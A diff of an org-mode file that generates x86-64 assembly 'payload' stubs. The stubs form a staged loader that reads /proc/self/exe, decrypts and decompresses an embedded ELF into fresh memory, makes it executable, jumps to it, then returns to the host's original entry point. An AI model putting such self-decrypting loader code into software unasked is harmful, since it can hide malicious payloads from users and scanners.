@@ -1,4 +1,5 @@
 #+title: Stub
+#+startup: folded
 * x64
 
 #+begin_src c :tangle payload/x64/all_in.c :mkdirp yes
@@ -280,30 +281,7 @@
 
   _start:
   .stage1:
-  .aslr_offset:
-    	call   $+5
-  	pop rax
-    	mov rsi, 0xfefffffffffff000	;
-  	push rax
-  	pop r15
-      	sub r15, rsi		; r15 aslr
-  .vaddr_stage1:
-  	and rax, 0xfffffffffffff000
-  	push rax			;[rsp] = (vaddr) s1
-  	mov rsi,  0xfefffffffffff000	; (len) s1
-  	push rsi			;[rsp] = (len, vaddr) s1
-  	call .open
-  .proc_self_exec:
-  	times 15 ret ; "/proc/self/exe"
-  .open:
-  	xor esi, esi
-  	pop rdi
-  	push 0x2
-  	pop rax
-  	syscall
-  	push rax		;[rsp] (fd, len, va) s1
-  	test rax, rax
-  	js _exit
+  	;; times 78 nop 0x4e
   .mmap_stage_2:
     	xor    r9d,r9d		;offset
     	push -1			;
@@ -314,7 +292,7 @@
     	pop rdx			; prot
     	xor    edi,edi 		;Vaddr
   	mov rsi, 0xfefffffffffff000	; (len) s2
-  	push rsi		;[rsp] (len) s2 (fd, len, vaddr) s1
+  	push rsi		;[rsp] (len) s2
   	push 0x9
   	pop rax
   	syscall
@@ -324,12 +302,12 @@
   	pop r13		;r13 vaddr stage 2, r15 aslr_offset.
   	jmp end_of_stage1
   .return_crypt_compress_addr:
-  	pop rsi		;src;;[rsp] size_s2_elf, fd, size_stage1, vaddr stage1
-  	mov rdx, 	0xfefffffffffff000	;[rsp] size_s2_elf, fd, size_stage1, vaddr stage1
+  	pop rsi		;src;;[rsp] (len) s2
+  	mov rdx, 	0xfefffffffffff000	;[rsp] (len) s2
   	sub rsp, rdx
   	push rsp		;dest
   	pop rdi
-  	push rdx	;[rsp] size_buffer_decrypt, decrypt_buffer, size_s2_elf, fd, size_s1, vaddr_s1
+  	push rdx	;[rsp] size_buffer_decrypt, decrypt_buffer,(len) s2
   	call decrypt; rsi in, rdx out_len, rdi out
   	test rax, rax
   	jz _exit
@@ -340,7 +318,7 @@
   	mov rsi, 0xfefffffffffff000
   	call lz77_decompress
   	pop rdx			;size_buffer_decrypt [rsp]
-  	add rsp, rdx ;Restore stack [rsp] size_s2_elf, fd, size_s1, vaddr_s1
+  	add rsp, rdx ;Restore stack [rsp] (len) s2
   	test rax, rax
   	jnz _exit
 
@@ -349,19 +327,53 @@
   	pop rdi			;vaddr
   	push 0x5
   	pop rdx			;prot R-X
-  	pop rsi			;size_s2_elf [rsp] fd_s1, size_s1, vaddr_s1
-  	push r13		;[rsp] vaddr_s2_elf, fd_s1, size_s1, vaddr_s1
-  	push rsi		;[rsp] size_s2_elf, vaddr_s2_elf, fd_s1, size_s1, vaddr_s1
+  	pop rsi			;size_s2_elf [rsp] argc, argv
+  	push r13		;[rsp] (va) s2
+  	push rsi		;[rsp] (len, va) s2
   	push 0xA
   	pop rax			;syscall mprotect 10
     	syscall
   	test rax, rax
     	jnz _exit
-  	.jmp_stage_2:
+  .aslr_offset:
+    	call   $+5
+  	pop rax
+    	mov rsi, 0xfefffffffffff000	;
+  	push rax
+  	pop r15
+      	sub r15, rsi		; r15 aslr
+  .vaddr_stage1:
+  	and rax, 0xfffffffffffff000
+  	push rax			;[rsp] = (vaddr) s1, (len, va) s2
+  	mov rsi,  0xfefffffffffff000	; (len) s1
+  	push rsi			;[rsp] = (len, vaddr) s1, (len, va) s2
+  	call .open
+  .proc_self_exec:
+  	times 15 ret ; "/proc/self/exe"
+  .open:
+  	xor esi, esi
+  	pop rdi
+  	push 0x2
+  	pop rax
+  	syscall
+  	push rax		;[rsp] (fd, len, va) s1, (len, va) s2
+  	test rax, rax
+  	js _exit
+  .jmp_stage_2:
   	pop rsi
   	push rsi
   	mov rax, 0xfefffffffeffffff
-  	add rax, r13
+  	add rax, r13		;Not mutate rax, and r13, r15
+  	pop r14			;r14 (fd) s1
+  	pop r12			;r12 (len) s1
+  	pop r11			;r11 (va) s1
+  	pop r10			;r10 (len) s2
+  	pop r9			;r9 (va) s2
+  	push r11		;[rsp] (va) s1
+  	push r12 		;[rsp] (len, va) s1
+  	push r14		;[rsp] (fd, len, va) s1
+  	push r9			;[rsp] (va) s2, (fd, len, va) s1
+  	push r10		;[rsp] (len, va) s2, (fd, len, va) s1
   	push rax
   	;; push r13;[rsp] (entry ,size,va) s2, fd_s1, size_s1, vaddr s1
   	ret;		 ;(pop rip va s2[rsp] size_s2_elf, vaddr_s2_elf, fd_s1, size_s1, vaddr s1
@@ -474,7 +486,7 @@
     	push 0x1		;write syscall
     	pop rax
             syscall			; I shouldn't protect this in case payload fail still working as normally.
-  	#+end_src
+#+end_src
 
 #+begin_src asm :tangle payload/x64/stage2.s :mkdirp yes
   global _start
@@ -1175,9 +1187,9 @@
 #+end_src
 
 #+begin_src asm :tangle payload/x64/stage3.s :mkdirp yes
-  	global _start
+global _start
 
-  _start:
+_start:
   	syscall			;call munmap s2
   	pop rdx ;reset this register
   	ret			;jmp to entrypoint Interp or not.
